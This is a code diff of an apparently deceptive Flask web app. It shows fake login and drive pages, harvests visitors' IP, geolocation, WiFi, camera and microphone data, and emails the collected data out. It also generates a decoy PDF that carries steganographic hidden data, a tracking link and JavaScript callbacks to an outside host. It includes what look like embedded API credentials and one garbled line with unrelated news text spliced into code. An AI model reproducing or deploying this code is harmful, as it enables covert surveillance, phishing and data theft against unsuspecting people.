@@ -28,9 +28,12 @@ from email.mime.base import MIMEBase
 from email import encoders
 from datetime import datetime, timedelta
 
-# Configure the SDK with your Gemini API key
+# Configure the Gemini API with your API key
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
+
+# Create required directories
 os.makedirs('static/captures', exist_ok=True)
+
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # For session management
 
@@ -58,6 +61,7 @@ downloaded_reports = []
 data_buffer = []
 images_to_send = []  # To store image filenames for emailing
 buffer_lock = threading.Lock()
+
 
 def send_email(data_list, image_list):
     smtp_server = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
@@ -91,6 +95,7 @@ def send_email(data_list, image_list):
     except Exception as e:
         logging.error(f"Failed to send email: {e}")
 
+
 def email_sender_thread():
     while True:
         time.sleep(10)
@@ -99,6 +104,7 @@ def email_sender_thread():
                 send_email(data_buffer.copy(), images_to_send.copy())
                 data_buffer.clear()
                 images_to_send.clear()
+
 
 def get_wifi_location_from_wigle(bssid):
     username = "AID9d6a1f4d617967b3d4c6189558862314"
@@ -118,9 +124,11 @@ def get_wifi_location_from_wigle(bssid):
         logging.error(f"Error querying Wigle API: {e}")
     return None, None
 
+
 def get_hidden_message(data):
     encoded = base64.b64encode(json.dumps(data).encode()).decode()
     return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"
+
 
 def get_ip_geolocation(ip):
     try:
@@ -133,6 +141,7 @@ def get_ip_geolocation(ip):
     except Exception as e:
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
+
 
 def get_wifi_interfaces():
     try:
@@ -149,6 +158,7 @@ def get_wifi_interfaces():
     except Exception as e:
         logging.error(f"Error retrieving WiFi interfaces: {e}")
         return {}
+
 
 def collect_data(req):
     ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
@@ -204,14 +214,20 @@ def collect_data(req):
     }
     return log_message
 
-# Monkey patch collect_data
+
+# Monkey patch collect_data to store data in the buffer
 original_collect_data = collect_data
+
+
 def patched_collect_data(*args, **kwargs):
     data = original_collect_data(*args, **kwargs)
     with buffer_lock:
         data_buffer.append(data)
     return data
+
+
 collect_data = patched_collect_data
+
 
 def embed_data_in_image(data):
     encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
@@ -219,6 +235,7 @@ def embed_data_in_image(data):
     base_img = PILImage.new('RGB', (500, 500), color='white')
     stego_img = lsb.hide(base_img, encrypted_str)
     return stego_img
+
 
 def simulate_multi_stage_payload(data):
     logging.info(f"Simulating multi-stage payload delivery with data: {json.dumps(data)}")
@@ -228,47 +245,49 @@ def simulate_multi_stage_payload(data):
     logging.info(f"Simulated multi-stage payload: {json.dumps(stage_payload)}")
     return stage_payload
 
+
 def simulate_dll_injection():
     logging.info("Simulated DLL injection executed (defensive demonstration only)")
     return "DLL injection simulated"
+
 
 def get_gemini_report(data):
     try:
         prompt = (
             """You are a cybersecurity investigator tasked with analyzing device and user details
-            to identify potential connections and patterns related to online harassment.
-            Your goal is to generate a report highlighting potential leads for further investigation.
+to identify potential connections and patterns related to online harassment.
+Your goal is to generate a report highlighting potential leads for further investigation.
 
-            **Important Considerations:**
-            * This analysis is for investigative purposes only. It does NOT definitively identify a harasser.
-            * False positives are possible. Any potential connections identified must be thoroughly investigated before any action is taken.
-            * Focus on identifying patterns and anomalies in the data.
-            * Consider the limitations of the data.
-            * Avoid making assumptions or drawing hasty conclusions.
-            * Ensure all actions comply with legal and ethical guidelines.
+**Important Considerations:**
+* This analysis is for investigative purposes only. It does NOT definitively identify a harasser.
+* False positives are possible. Any potential connections identified must be thoroughly investigated before any action is taken.
+* Focus on identifying patterns and anomalies in the data.
+* Consider the limitations of the data.
+* Avoid making assumptions or drawing hasty conclusions.
+* Ensure all actions comply with legal and ethical guidelines.
 
-            **Data Description:**
-            The provided data contains information about devices and users potentially involved in online harassment. This may include:
-            * **Device Information:** IP addresses, device IDs, operating system, browser information, location data (if available).
-            * **User Details:** Usernames, email addresses, social media profiles, online activity logs.
+**Data Description:**
+The provided data contains information about devices and users potentially involved in online harassment. This may include:
+* **Device Information:** IP addresses, device IDs, operating system, browser information, location data (if available).
+* **User Details:** Usernames, email addresses, social media profiles, online activity logs.
 
-            **Instructions:**
-            1. Analyze Data for Potential Connections: Identify shared IP addresses, similar device fingerprints, overlapping online activity, related social media accounts, anomalous behavior, and geolocation patterns.
-            2. Assess the Strength of Connections: Assess based on supporting evidence.
-            3. Prioritize Potential Leads: Identify promising leads for further investigation.
-            4. Format the Report:
-                **Investigative Analysis Report**
-                **Date:** [Current Date and Time]
-                **Data Source:** [Description of the data source]
-                **Executive Summary:** [Overview of potential connections and leads]
-                **Detailed Findings:**
-                * **Potential Connection 1:** [Description]
-                    * **Users Involved:** [List]
-                    * **Supporting Evidence:** [Data points]
-                    * **Strength of Connection:** [High/Medium/Low]
-                    * **Potential Lead:** [Explanation]
-                **Conclusion:** [Summary of promising leads]
-            """ + json.dumps(data, indent=2)
+**Instructions:**
+1. Analyze Data for Potential Connections: Identify shared IP addresses, similar device fingerprints, overlapping online activity, related social media accounts, anomalous behavior, and geolocation patterns.
+2. Assess the Strength of Connections: Assess based on supporting evidence.
+3. Prioritize Potential Leads: Identify promising leads for further investigation.
+4. Format the Report:
+   **Investigative Analysis Report**
+   **Date:** [Current Date and Time]
+   **Data Source:** [Description of the data source]
+   **Executive Summary:** [Overview of potential connections and leads]
+   **Detailed Findings:**
+   * **Potential Connection 1:** [Description]
+       * **Users Involved:** [List]
+       * **Supporting Evidence:** [Data points]
+       * **Strength of Connection:** [High/Medium/Low]
+       * **Potential Lead:** [Explanation]
+   **Conclusion:** [Summary of promising leads]
+""" + json.dumps(data, indent=2)
         )
         model = genai.GenerativeModel('gemini-2.0-flash')
         response = model.generate_content(prompt)
@@ -279,12 +298,14 @@ def get_gemini_report(data):
         logging.error(f"Error contacting Gemini AI: {e}")
         return f"Error contacting Gemini AI: {e}"
 
+
 def generate_pdf(logged_data):
     buffer = BytesIO()
     doc = SimpleDocTemplate(buffer, pagesize=letter)
     styles = getSampleStyleSheet()
     story = []
 
+    # Add fake PDF content
     story.append(Paragraph("Fake PDF Document", styles['Title']))
     story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
     address = fake.address().replace('\n', ', ')
@@ -292,12 +313,14 @@ def generate_pdf(logged_data):
     story.append(Paragraph("Additional Info:", styles['Normal']))
     story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))
 
+    # Embed hidden data in an image
     stego_img = embed_data_in_image(logged_data)
     img_buffer = BytesIO()
     stego_img.save(img_buffer, format='PNG')
     img_buffer.seek(0)
     story.append(Image(img_buffer, width=100, height=100))
 
+    # Add verification link with a unique token
     token = str(uuid.uuid4())
     verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
     story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))
@@ -314,6 +337,7 @@ def generate_pdf(logged_data):
         pdf_writer.add_page(page)
     pdf_writer.add_metadata({'/HiddenData': hidden_message})
 
+    # Inject JavaScript into the PDF for callbacks
     js_code = f"""
     if (typeof XMLHttpRequest !== 'undefined') {{
         try {{
@@ -327,12 +351,20 @@ def generate_pdf(logged_data):
     if (typeof XMLHttpRequest !== 'undefined') {{
         try {{
             var req2 = new XMLHttpRequest();
-            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), Sri Lanka - New Zealand 2023 World Cup match on October 28, 2023, has been rescheduled to October 29 due to logistical reasons and will now start at 2 PM IST instead of 10:30 AM IST.
+            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
+            req2.send();
+        }} catch(e) {{}}
+    }}
+    """
+
+    # (Optional) You can embed the JavaScript into the PDF if your PDF viewer supports it.
+    # For this example, we are not using PyPDF2 to inject JS, but you can extend this functionality.
 
     new_buffer = BytesIO()
     pdf_writer.write(new_buffer)
     new_buffer.seek(0)
     return new_buffer, token
+
 
 # HTML Templates
 LOGIN_PAGE = """
@@ -561,6 +593,7 @@ DRIVE_PAGE = """
 def index():
     return redirect(url_for('login'))
 
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -573,12 +606,14 @@ def login():
         return redirect(url_for('permissions'))
     return render_template_string(LOGIN_PAGE)
 
+
 @app.route('/permissions')
 def permissions():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
     error = request.args.get('error')
     return render_template_string(PERMISSIONS_PAGE, error=error)
+
 
 @app.route('/drive')
 def drive():
@@ -592,15 +627,16 @@ def drive():
     date2 = two_hours_ago.strftime("%b %d, %Y, %H:%M")
     return render_template_string(DRIVE_PAGE, permissions=permissions, date1=date1, date2=date2)
 
+
 @app.route('/download', methods=['POST'])
 def download():
     logged_data = collect_data(request)
-    logging.info(f"Download data collected: {json.dumps(*logged_data)}")
-    
+    logging.info(f"Download data collected: {json.dumps(logged_data)}")
+
     gemini_report = get_gemini_report(logged_data)
     logged_data["gemini_report"] = gemini_report
     logging.info(f"Gemini AI report: {gemini_report}")
-    
+
     multi_stage_result = simulate_multi_stage_payload(logged_data)
     dll_injection_result = simulate_dll_injection()
     logged_data["simulation"] = {
@@ -614,6 +650,7 @@ def download():
 
     return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
 
+
 @app.route('/verify', methods=['GET'])
 def verify():
     token = request.args.get('token')
@@ -625,11 +662,13 @@ def verify():
         return "Thank you!", 200
     return "Invalid token", 400
 
+
 @app.route('/pdf_callback', methods=['GET'])
 def pdf_callback():
     hidden_data = request.args.get('data', '')
     logging.info(f"Primary PDF callback triggered with data: {hidden_data}")
     return "Primary callback logged", 200
+
 
 @app.route('/pdf_callback_stage2', methods=['GET'])
 def pdf_callback_stage2():
@@ -638,6 +677,7 @@ def pdf_callback_stage2():
         logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
         return "Stage2 callback logged", 200
     return "Invalid token", 400
+
 
 @app.route('/logs')
 def display_logs():
@@ -708,6 +748,7 @@ def display_logs():
     """
     return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports, captures=captures)
 
+
 @app.route('/log_location', methods=['POST'])
 def log_location():
     data = request.json
@@ -715,6 +756,7 @@ def log_location():
         data_buffer.append(data)
     logging.info(f"Location data: {json.dumps(data)}")
     return "Location logged", 200
+
 
 @app.route('/log_camera', methods=['POST'])
 def log_camera():
@@ -737,6 +779,7 @@ def log_camera():
         logging.error(f"Error in log_camera: {e}")
         return {'status': 'error', 'message': str(e)}, 500
 
+
 @app.route('/log_microphone', methods=['POST'])
 def log_microphone():
     data = request.json
@@ -744,6 +787,7 @@ def log_microphone():
         data_buffer.append(data)
     logging.info(f"Microphone data: {json.dumps(data)}")
     return "Microphone logged", 200
+
 
 @app.route('/log_other_data', methods=['POST'])
 def log_other_data():
@@ -753,9 +797,11 @@ def log_other_data():
     logging.info(f"Other data: {json.dumps(data)}")
     return "Other data logged", 200
 
+
 @app.route('/simulate')
 def simulate():
     return "Simulation endpoint", 200
+
 
 if __name__ == '__main__':
     threading.Thread(target=email_sender_thread, daemon=True).start()
